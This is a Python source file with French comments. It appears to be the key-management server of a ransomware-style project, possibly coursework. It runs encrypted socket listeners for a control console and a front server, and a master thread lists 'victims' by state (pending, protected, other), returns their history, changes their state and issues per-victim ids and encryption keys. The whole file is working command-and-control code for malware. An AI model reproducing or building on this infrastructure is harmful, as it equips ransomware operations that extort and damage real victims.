import queue
import threading
import utile.data as data
import utile.message as message
import utile.network as net
import utile.security as secu
import utile.config as config

# Création d'un dictionnaire en constante pour garder les Queues FIFO de coté
THREADS_QUEUE = {'CONTROLE': '', 'FRONTAL': ''}


def Console_Controle(FIFO_message_type, CFG):
    # Création d'un serveur qui écoute sur le port et l'adresse fournie par le fichier CFG
    socket_serv = net.start_net_serv_client(adresse=CFG['IP'], port=int(CFG['PORT_CONSO']))
    # Création d'une queue FIFO
    FIFO_resp = queue.Queue()
    # Ajout de la queue FIFO dans le dictionnaire en constante
    THREADS_QUEUE['CONTROLE'] = FIFO_resp
    while True:
        # Ecoute à l'infinie pour pouvoir recevoir des connexions à l'infinie
        # Le socket.accept() a été enlevé de la fonction de network pour pouvoir relancer à l'infinie
        # Un serveur sans recréer un socket ou autre -> meilleur performances
        conn, addr = socket_serv.accept()
        # Création d'une clé Diffie Hellman servant au chiffrement AES-GCM 256
        key = secu.Diffie_Hellman_exchange_key(conn)
        # Affichage de qui se connecte sur quelle adresse
        print(
            f'[+] CONSOLE CONTROLE | Connexion établie depuis {addr[0]}:{addr[1]} sur l\'adresse '
            f'{conn.getsockname()[0]}:{conn.getsockname()[1]}\n')
        # Lancement d'un while true pour essayer de recevoir des messages à l'infinie sans se déconnecter
        while True:
            try:
                # Récupère le message
                recv_data = net.receive_message(conn)
                # Déchiffre le message
                recv_data = secu.AES_GCM_decrypt(recv_data, key)
                # Envoi dans la Queue FIFO avec un ID (permet de correspondre les Queues dans le ThreadMaster)
                FIFO_message_type.put([recv_data, 'CONTROLE'])
            except:
                # Si on ne rentre dans ce except, cela veut dire que le destinataire s'est déconnecté ou crash, ...
                # Donc déconnexion "officielle" avec une annonce dans la console
                conn.close()
                print('[+] Déconnexion de la Console_Controle')
                break

            while True:
                # Récupère des paquets dans la Queue FIFO (à l'infinie vu que l'on se trouve dans une boucle)
                packet = FIFO_resp.get()
                # Annonce un task done pour débloquer le code dans le threadmaster
                FIFO_resp.task_done()
                # Chiffrement du paquet
                packet_encrypted = secu.AES_GCM_encrypt(packet, key)
                # Envoi du paquet vers le destinataire (console de contrôle)
                net.send_message(conn, packet_encrypted)
                # si le type de paquet est history end ou list victim end on sort de la boucle
                # pour retourner au try except grâce au while true
                if message.get_message_type(packet) == 'HISTORY_END' or message.get_message_type(
                        packet) == 'LIST_VICTIM_END':
                    break


def Serveur_Frontal(FIFO_message_type, CFG):
    # Création d'un serveur qui écoute sur le port et l'adresse fournie par le fichier CFG (serveur frontal)
    socket_serv = net.start_net_serv_client(adresse=CFG['IP'], port=int(CFG['PORT_FRON']))
    # Création d'une queue FIFO
    FIFO_resp = queue.Queue()
    # Ajout de la queue FIFO dans le dictionnaire en constante
    THREADS_QUEUE['FRONTAL'] = FIFO_resp
    while True:
        # Ecoute à l'infinie pour pouvoir recevoir des connexions à l'infinie
        # Le socket.accept() a été enlevé de la fonction de network pour pouvoir relancer à l'infinie
        # Un serveur sans recréer un socket ou autre -> meilleur performances
        conn, addr = socket_serv.accept()
        # Création d'une clé Diffie Hellman servant au chiffrement AES-GCM 256
        key = secu.Diffie_Hellman_exchange_key(conn)
        # Affichage de qui se connecte sur quelle adresse
        print(
            f'[+] SERVEUR FRONTAL | Connexion établie depuis {addr[0]}:{addr[1]} sur l\'adresse '
            f'{conn.getsockname()[0]}:{conn.getsockname()[1]}\n')

        while True:
            try:
                # Récupère le message
                recv_data = net.receive_message(conn)
                # Déchiffre le message
                recv_data = secu.AES_GCM_decrypt(recv_data, key)
                # Envoi dans la Queue FIFO avec un ID (permet de correspondre les Queues dans le ThreadMaster)
                FIFO_message_type.put([recv_data, 'FRONTAL'])
            except:
                # Si on ne rentre dans ce except, cela veut dire que le destinataire s'est déconnecté ou crash, ...
                # Donc déconnexion "officielle" avec une annonce dans la console
                conn.close()
                print('[+] Déconnexion du Serveur Frontal')
                break
            while True:
                # Récupère des paquets dans la Queue FIFO (à l'infinie vu que l'on se trouve dans une boucle)
                packet = FIFO_resp.get()
                # Annonce un task done pour débloquer le code dans le threadmaster
                FIFO_resp.task_done()
                # Chiffrement du paquet
                packet_encrypt = secu.AES_GCM_encrypt(packet, key)
                # Envoi du paquet vers le destinataire (console de contrôle)
                net.send_message(conn, packet_encrypt)
                # si le type de paquet est history end ou list victim end on sort de la boucle
                # pour retourner au try except grâce au while true
                if message.get_message_type(packet) == 'HISTORY_END' or message.get_message_type(
                        packet) == 'LIST_VICTIM_END' or message.get_message_type(packet) == 'INITIALIZE_KEY':
                    break


def ThreadMaster(FIFO_message_type):
    while True:
        # Récupération d'une donnée dans la FIFO
        # Divisé en 2 parties, recv_data et id_thread
        recv_data, id_thread = FIFO_message_type.get()
        # Récupération de la queue FIFO correspondante grâce à l'id et au dictionnaire en constante
        FIFO_resp = THREADS_QUEUE[id_thread]
        # Récupération du type de message pour trouver la bonne condition
        message_type = message.get_message_type(recv_data)
        if message_type == 'LIST_VICTIM_REQ':
            # execution de la fonction get_victim_list() pour plus d'informations -> voir data.py
            # Retourne 3 listes différentes, une liste de pending, une liste protected et une liste other
            result_pending, result_protected, result_other = data.get_victim_list()

            # Pour chaque liste, on récupère une victime
            # Création un paquet
            # Envoi du paquet dans la Queue FIFO correspondante
            for victim in result_pending:
                list_victim_resp1 = message.set_message("LIST_VICTIM_RESP", victim)
                print(list_victim_resp1)
                FIFO_resp.put(list_victim_resp1)
                # Bloque le code jusqu'à ce qu'un task_done() soit fait
                FIFO_resp.join()

            for victim in result_protected:
                list_victim_resp2 = message.set_message("LIST_VICTIM_RESP", victim)
                print(list_victim_resp2)
                FIFO_resp.put(list_victim_resp2)
                # Bloque le code jusqu'à ce qu'un task_done() soit fait
                FIFO_resp.join()

            for victim in result_other:
                list_victim_resp3 = message.set_message("LIST_VICTIM_RESP", victim)
                print(list_victim_resp3)
                FIFO_resp.put(list_victim_resp3)
                # Bloque le code jusqu'à ce qu'un task_done() soit fait
                FIFO_resp.join()
            # Création d'un paquet List_victim_end pour indiquer au destinataire qu'on a terminé d'envoyer des messages
            list_victim_end = message.set_message("LIST_VICTIM_END")
            FIFO_resp.put(list_victim_end)
            FIFO_resp.join()

        elif message_type == 'HISTORY_REQ':
            # Execution de la fonction get_history() pour plus d'informations -> voir data.py
            result = data.get_history(recv_data)
            # Création des paquets et envoi des resultats dans les Queues correspondante
            history_resp = message.set_message('HISTORY_RESP', result[0])
            history_end = message.set_message('HISTORY_END', [recv_data['HIST_REQ']])
            FIFO_resp.put(history_resp)
            FIFO_resp.put(history_end)
            FIFO_resp.join()

        elif message_type == 'CHANGE_STATE':
            # Execution de la fonction change_state() pour plus d'informations -> voir data.py
            data.change_state(recv_data)

        elif message_type == 'INITIALIZE_REQ':
            # Execution de la fonction initialize_req() pour plus d'informations -> voir data.py
            list_info = data.initialize_req(recv_data)
            # Séparation du dictionnaire en 3 : id key et state
            id_victim, key, state = list_info[0]
            # Création d'un paquet initilize_key avec l'id, la clé et l'état vers la Queue FIFO
            FIFO_resp.put(message.set_message('INITIALIZE_KEY', [id_victim, key, state]))
            FIFO_resp.join()


def main():
    # Initialisation du fichier config
    cfg_file_cles = config.load_config('serveur_cles')

    # if not cfg_file_cles:
    #     config.create_config('serveur_cles')
    #     serveur_cles = config.load_config('serveur_cles')
    #     config.set_config(serveur_cles, 1, 'IP', "localhost")
    #     config.set_config(serveur_cles, 1, 'PORT_FRON', "8381")
    #     config.set_config(serveur_cles, 1, 'PORT_CONSO', "8380")
    #     config.save_config(serveur_cles, 'serveur_cles')
    #
    # # Reload car posait problème au démarrage sans CFG (crash)
    # cfg_file_cles = config.load_config('serveur_cles')

    # Création de la queue FIFO
    FIFO_message_type = queue.Queue()

    # création des threads
    Serveur_Frontal_thread = threading.Thread(target=Serveur_Frontal, args=(FIFO_message_type, cfg_file_cles))
    Console_Controle_thread = threading.Thread(target=Console_Controle, args=(FIFO_message_type, cfg_file_cles))

    # Lancement des threads
    Console_Controle_thread.start()
    Serveur_Frontal_thread.start()

    # Lancement du threadMaster
    ThreadMaster(FIFO_message_type)


if __name__ == '__main__':
    main()
